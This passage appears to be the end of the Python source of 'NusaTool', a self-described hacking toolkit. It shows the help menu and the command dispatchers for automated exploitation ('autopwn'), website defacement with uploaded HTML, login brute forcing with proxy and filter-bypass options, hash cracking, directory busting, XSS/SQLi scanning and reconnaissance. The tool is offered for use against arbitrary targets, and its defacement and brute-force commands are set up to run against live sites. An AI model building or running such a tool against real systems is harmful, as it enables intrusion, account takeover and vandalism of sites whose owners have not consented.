  {R}{BOLD}⚡ AUTOPWN{N}        {D}autopwn <target> [-p ports] [--threads N]{N}
  {C}───────────────────────────────────────────────{N}
  {R}◈ EXPLOIT / DEFACE{N}
    {G}deface{N}         {D}-u <url>{N}
    {G}urlscan{N}         {D}-u <url>{N}
    {G}cors{N}            {D}-u <url>{N}
    {G}csrf{N}            {D}-u <url>{N}
  {Y}◈ RECON / OSINT{N}
    {G}subdomain{N}      {D}-d <domain>{N}
    {G}dns{N}            {D}-d <domain>{N}
    {G}whois{N}          {D}-d <domain>{N}
    {G}paramspider{N}    {D}-d <domain> [--subs] [--threads N]{N}
    {G}scan{N}            {D}<domain>  (quick sweep: 60 common ports){N}
  {M}◈ BRUTEFORCE / CRACK{N}
    {G}autobf{N}          {D}<url>  (auto: just URL, detects everything){N}
    {G}loginbf{N}        {D}-u <url> -U <users> -P <pass> [--threads N]{N}
    {G}hashcrack{N}      {D}-t <hash> -w <wordlist> [--type md5|sha1|sha256]{N}
    {G}dirbust{N}        {D}-u <url> -w <wordlist>{N}
  {G}◈ NETWORK{N}
    {G}portscan{N}       {D}<target> [-p ports]{N}
    {G}servicedetect{N}  {D}-t <target> -p <ports>{N}
    {G}cve{N}             {D}[no args — checks from banners]{N}
  {G}◈ WEB VULN SCAN{N}
    {G}xss{N}            {D}-u <url>{N}
    {G}sqli{N}           {D}-u <url>{N}
  {C}◈ REPORT{N}
    {G}report{N}         {D}[-o output.html]{N}
  {C}◈ UTILITY{N}          {G}help{N} | {G}clear{N} | {G}banner{N} | {G}version{N} | {G}exit{N}

  {D}Examples:{N}
    {C}autopwn http://testphp.vulnweb.com{N}
    {C}deface -u https://target.com{N}
    {C}autobf https://target.com/login{N}
    {C}loginbf -u https://target.com/login -U users.txt -P pass.txt --threads 20{N}
    {C}hashcrack -t 5f4dcc3b5aa765d61d8327deb882cf99 -w wordlist.txt{N}
        """)
    def _get(self, args, *flags):
        for i, a in enumerate(args):
            if a in flags and i+1 < len(args): return args[i+1]
        return None
    def _exec(self, cmd, args):
        try:
            if cmd == "autopwn":
                target = self._get(args,"-t","--target") or (args[0] if args and not args[0].startswith("-") else None)
                if not target: print(f"  {R}✘{N} Usage: autopwn <target>"); return
                AutoPwn(target, ports=self._get(args,"-p","--ports") or "1-1024",
                        threads=int(self._get(args,"--threads") or "20")).run()
            elif cmd == "cors":
                u = self._get(args,"-u","--url")
                if not u: print(f"  {R}✘{N} Usage: cors -u <url>"); return
                CORSScanner(u).scan()
            elif cmd == "csrf":
                u = self._get(args,"-u","--url")
                if not u: print(f"  {R}✘{N} Usage: csrf -u <url>"); return
                CSRFScanner(u).scan()
            elif cmd == "cve":
                print(f"  {Y}⚠{N} CVE Checker runs automatically from service banners.\n  Use {C}autopwn{N} for full scan with banner detection.\n")
            elif cmd == "urlscan":
                u = self._get(args,"-u","--url")
                if not u: print(f"  {R}✘{N} Usage: urlscan -u <url>"); return
                URLScanner(u).scan()
            elif cmd == "portscan":
                t = self._get(args,"-t","--target") or (args[0] if args and not args[0].startswith("-") else None)
                p = self._get(args,"-p","--ports") or "1-1024"
                if not t: print(f"  {R}✘{N} Usage: portscan <target> [-p ports]"); return
                PortScanner(t, p).run()
            elif cmd == "paramspider":
                d = self._get(args,"-d","--domain")
                if not d: print(f"  {R}✘{N} Usage: paramspider -d <domain> [--subs] [--threads N]"); return
                ParamSpider(d, "--subs" in args, int(self._get(args,"--threads") or "10")).run()
            elif cmd in ("autobf", "autologin"):
                u = self._get(args,"-u","--url") or (args[0] if args and not args[0].startswith("-") else None)
                if not u: print(f"  {R}✘{N} Usage: autobf <url> [--threads N] [--delay 0.5]"); return
                AutoBruteforcer(u, int(self._get(args,"--threads") or "5"), float(self._get(args,"--delay") or "0"), self._get(args,"--proxy")).run()
            elif cmd in ("scan","quick"):
                t = args[0] if args else (self._get(args,"-t","--target"))
                if not t: print(f"  {R}✘{N} Usage: scan <domain>"); return
                QuickScanner(t).run()
            elif cmd == "servicedetect":
                t = self._get(args,"-t","--target"); p = self._get(args,"-p","--ports")
                if not t or not p: print(f"  {R}✘{N} Usage: servicedetect -t <target> -p <ports>"); return
                ServiceDetector(t, p).run()
            elif cmd == "xss":
                u = self._get(args,"-u","--url"); m = self._get(args,"--method") or "GET"
                if not u: print(f"  {R}✘{N} Usage: xss -u <url>"); return
                XSSScanner(u, m, self._get(args,"--param"), BypassEngine(u)).run()
            elif cmd == "sqli":
                u = self._get(args,"-u","--url"); m = self._get(args,"--method") or "GET"
                if not u: print(f"  {R}✘{N} Usage: sqli -u <url>"); return
                SQLiScanner(u, m, self._get(args,"--param"), BypassEngine(u)).run()
            elif cmd == "subdomain":
                d = self._get(args,"-d","--domain")
                if not d: print(f"  {R}✘{N} Usage: subdomain -d <domain>"); return
                SubdomainEnumerator(d, self._get(args,"-w","--wordlist")).run()
            elif cmd == "dns":
                d = self._get(args,"-d","--domain")
                if not d: print(f"  {R}✘{N} Usage: dns -d <domain>"); return
                DNSRecon(d, self._get(args,"--record") or "ALL").run()
            elif cmd == "whois":
                d = self._get(args,"-d","--domain")
                if not d: print(f"  {R}✘{N} Usage: whois -d <domain>"); return
                WhoisLookup(d).run()
            elif cmd == "dirbust":
                u = self._get(args,"-u","--url"); w = self._get(args,"-w","--wordlist")
                if not u or not w: print(f"  {R}✘{N} Usage: dirbust -u <url> -w <wordlist>"); return
                DirBruteforcer(u, w, self._get(args,"--ext"), int(self._get(args,"--threads") or "10"), BypassEngine(u)).run()
            elif cmd == "deface":
                u = self._get(args,"-u","--url")
                if not u: print(f"  {R}✘{N} Usage: deface -u <url> [--file <path>] [--content <html>]"); return
                f = self._get(args,"-f","--file"); c = self._get(args,"-c","--content")
                dt = DefaceTester(u, BypassEngine(u))
                if f or c:
                    dt.deface(filepath=f, content=c)
                else:
                    dt.scan()
            elif cmd in ("hashcrack", "hash"):
                h = self._get(args,"-t","--target") or (args[0] if args and not args[0].startswith("-") else None)
                w = self._get(args,"-w","--wordlist")
                if not h or not w: print(f"  {R}✘{N} Usage: hashcrack -t <hash> -w <wordlist> [--type md5|sha1|sha256]"); return
                HashCracker(h, w, self._get(args,"--type") or "auto", int(self._get(args,"--threads") or "4")).run()
            elif cmd == "loginbf":
                u = self._get(args,"-u","--url"); U = self._get(args,"-U","--usernames"); P = self._get(args,"-P","--passwords")
                if not u or not U or not P: print(f"  {R}✘{N} Usage: loginbf -u <url> -U <users> -P <pass> [--threads N] [--mode form|json|basic|bearer]"); return
                LoginBruteforcer(u, U, P,
                    user_f=self._get(args,"--user-field") or "username",
                    pass_f=self._get(args,"--pass-field") or "password",
                    fail_s=self._get(args,"--fail-string") or "incorrect",
                    method=self._get(args,"--method") or "POST",
                    threads=int(self._get(args,"--threads") or "1"),
                    delay=float(self._get(args,"--delay") or "0"),
                    mode=self._get(args,"--mode") or "form",
                    proxy=self._get(args,"--proxy"),
                    bypass=BypassEngine(u)).run()
            elif cmd == "report":
                ReportGenerator().generate(self._get(args,"-o","--output") or "nusatool_report.html")
            else:
                print(f"  {R}✘{N} Unknown: {Y}{cmd}{N}  {D}(try help){N}")
        except KeyboardInterrupt: print(f"\n  {Y}⚠ Interrupted{N}")
        except Exception as e: print(f"  {R}✘ Error:{N} {e}")


# ══════════════════════════════════════════════════════
#  DIRECT MODE
# ══════════════════════════════════════════════════════

def direct(module, args):
    try:
        if module == "autopwn":
            target = None; ports = "1-1024"; threads = 20; wd = None
            for i, a in enumerate(args):
                if a in ("-t","--target") and i+1<len(args): target = args[i+1]
                elif a in ("-p","--ports") and i+1<len(args): ports = args[i+1]
                elif a=="--threads" and i+1<len(args): threads = int(args[i+1])
                elif a=="-w" and i+1<len(args): wd = args[i+1]
                elif not a.startswith("-") and not target: target = a
            if not target: print("[-] Usage: autopwn <target>"); return
            AutoPwn(target, wd, ports, threads).run()
        elif module in ("cors","csrf"):
            p = argparse.ArgumentParser(prog=module)
            p.add_argument("-u","--url",required=True)
            a = p.parse_args(args)
            (CORSScanner if module=="cors" else CSRFScanner)(a.url).scan()
        elif module == "urlscan":
            p = argparse.ArgumentParser(prog="urlscan")
            p.add_argument("-u","--url",required=True)
            a = p.parse_args(args); URLScanner(a.url).scan()
        elif module == "portscan":
            p = argparse.ArgumentParser(prog="portscan")
            p.add_argument("target",nargs="?"); p.add_argument("-t","--target",dest="tflag")
            p.add_argument("-p","--ports",default="1-1024"); p.add_argument("--timeout",type=float,default=1.0)
            a = p.parse_args(args)
            target = a.tflag or a.target
            if not target: print("[-] portscan <target> [-p ports]"); return
            PortScanner(target,a.ports,a.timeout).run()
        elif module == "paramspider":
            p = argparse.ArgumentParser(prog="paramspider")
            p.add_argument("-d","--domain",required=True); p.add_argument("--subs",action="store_true"); p.add_argument("--threads",type=int,default=10)
            a = p.parse_args(args); ParamSpider(a.domain,a.subs,a.threads).run()
        elif module in ("autobf", "autologin"):
            p = argparse.ArgumentParser(prog="autobf")
            p.add_argument("url",nargs="?"); p.add_argument("-u","--url",dest="uflag")
            p.add_argument("--threads",type=int,default=5); p.add_argument("--delay",type=float,default=0); p.add_argument("--proxy")
            a = p.parse_args(args)
            target = a.uflag or a.url
            if not target: print("[-] Usage: autobf <url> [--threads N]"); return
            AutoBruteforcer(target, a.threads, a.delay, a.proxy).run()
        elif module == "scan":
            target = args[0] if args else None
            if not target: print("[-] scan <domain>"); return
            QuickScanner(target).run()
        elif module == "servicedetect":
            p = argparse.ArgumentParser(prog="servicedetect")
            p.add_argument("-t","--target",required=True); p.add_argument("-p","--ports",required=True)
            a = p.parse_args(args); ServiceDetector(a.target,a.ports).run()
        elif module == "xss":
            p = argparse.ArgumentParser(prog="xss")
            p.add_argument("-u","--url",required=True); p.add_argument("--method",default="GET"); p.add_argument("--param")
            a = p.parse_args(args); XSSScanner(a.url,a.method,a.param,BypassEngine(a.url)).run()
        elif module == "sqli":
            p = argparse.ArgumentParser(prog="sqli")
            p.add_argument("-u","--url",required=True); p.add_argument("--method",default="GET"); p.add_argument("--param")
            a = p.parse_args(args); SQLiScanner(a.url,a.method,a.param,BypassEngine(a.url)).run()
        elif module == "subdomain":
            p = argparse.ArgumentParser(prog="subdomain")
            p.add_argument("-d","--domain",required=True); p.add_argument("-w","--wordlist"); p.add_argument("--threads",type=int,default=20)
            a = p.parse_args(args); SubdomainEnumerator(a.domain,a.wordlist,a.threads).run()
        elif module == "dns":
            p = argparse.ArgumentParser(prog="dns")
            p.add_argument("-d","--domain",required=True); p.add_argument("--record",default="ALL")
            a = p.parse_args(args); DNSRecon(a.domain,a.record).run()
        elif module == "whois":
            p = argparse.ArgumentParser(prog="whois")
            p.add_argument("-d","--domain",required=True)
            a = p.parse_args(args); WhoisLookup(a.domain).run()
        elif module == "dirbust":
            p = argparse.ArgumentParser(prog="dirbust")
            p.add_argument("-u","--url",required=True); p.add_argument("-w","--wordlist",required=True)
            p.add_argument("--ext"); p.add_argument("--threads",type=int,default=10)
            a = p.parse_args(args); DirBruteforcer(a.url,a.wordlist,a.ext,a.threads,BypassEngine(a.url)).run()
        elif module == "deface":
            p = argparse.ArgumentParser(prog="deface")
            p.add_argument("-u","--url",required=True)
            p.add_argument("-f","--file",help="Path to HTML file to upload")
            p.add_argument("-c","--content",help="Inline HTML content to upload")
            a = p.parse_args(args)
            dt = DefaceTester(a.url, BypassEngine(a.url))
            if a.file or a.content:
                dt.deface(filepath=a.file, content=a.content)
            else:
                dt.scan()
        elif module in ("hashcrack", "hash"):
            p = argparse.ArgumentParser(prog="hashcrack")
            p.add_argument("-t","--target",required=True,help="Target hash")
            p.add_argument("-w","--wordlist",required=True)
            p.add_argument("--type",choices=["auto","md5","sha1","sha224","sha256","sha384","sha512"],default="auto")
            p.add_argument("--threads",type=int,default=4)
            a = p.parse_args(args); HashCracker(a.target,a.wordlist,a.type,a.threads).run()
        elif module == "loginbf":
            p = argparse.ArgumentParser(prog="loginbf")
            p.add_argument("-u","--url",required=True); p.add_argument("-U","--usernames",required=True); p.add_argument("-P","--passwords",required=True)
            p.add_argument("--user-field",default="username"); p.add_argument("--pass-field",default="password")
            p.add_argument("--fail-string",default="incorrect"); p.add_argument("--method",default="POST")
            p.add_argument("--threads",type=int,default=1); p.add_argument("--delay",type=float,default=0)
            p.add_argument("--mode",choices=["form","json","basic","bearer"],default="form")
            p.add_argument("--proxy")
            a = p.parse_args(args)
            LoginBruteforcer(a.url,a.usernames,a.passwords,
                user_f=a.user_field, pass_f=a.pass_field,
                fail_s=a.fail_string, method=a.method,
                threads=a.threads, delay=a.delay,
                mode=a.mode, proxy=a.proxy,
                bypass=BypassEngine(a.url)).run()
        elif module == "report":
            p = argparse.ArgumentParser(prog="report")
            p.add_argument("-o","--output",default="nusatool_report.html")
            a = p.parse_args(args); ReportGenerator().generate_html(a.output)
        else:
            print(f"  {R}✘{N} Unknown: {Y}{module}{N}")
            print(f"  {C}◈{N} Available: {G}autopwn scan cors csrf urlscan portscan servicedetect xss sqli deface subdomain dns whois dirbust loginbf autobf hashcrack paramspider report{N}")
    except SystemExit: pass
    except Exception as e: print(f"  {R}✘ Error:{N} {e}")

def main():
    p = argparse.ArgumentParser(description="NusaTool v1.2 — Hacking Toolkit")
    p.add_argument("--version", action="version", version=f"NusaTool v{VERSION}")
    if len(sys.argv) == 1: NusaCLI().run(); return
    if sys.argv[1] in ("-h","--help"): p.print_help(); print(f"\n  Run {C}nusatool.py{N} for interactive CLI\n"); return
    if sys.argv[1] == "--version": print(f"NusaTool v{VERSION}"); return
    if not sys.argv[1].startswith("-") and sys.argv[1] not in (
        "autopwn","scan","cors","csrf","cve","urlscan","portscan","servicedetect",
        "xss","sqli","subdomain","dns","whois","dirbust","loginbf","hashcrack","hash","report","paramspider","deface","autobf","autologin","help"):
        AutoPwn(sys.argv[1]).run(); return
    print(BANNER); direct(sys.argv[1], sys.argv[2:])

if __name__ == "__main__":
    main()
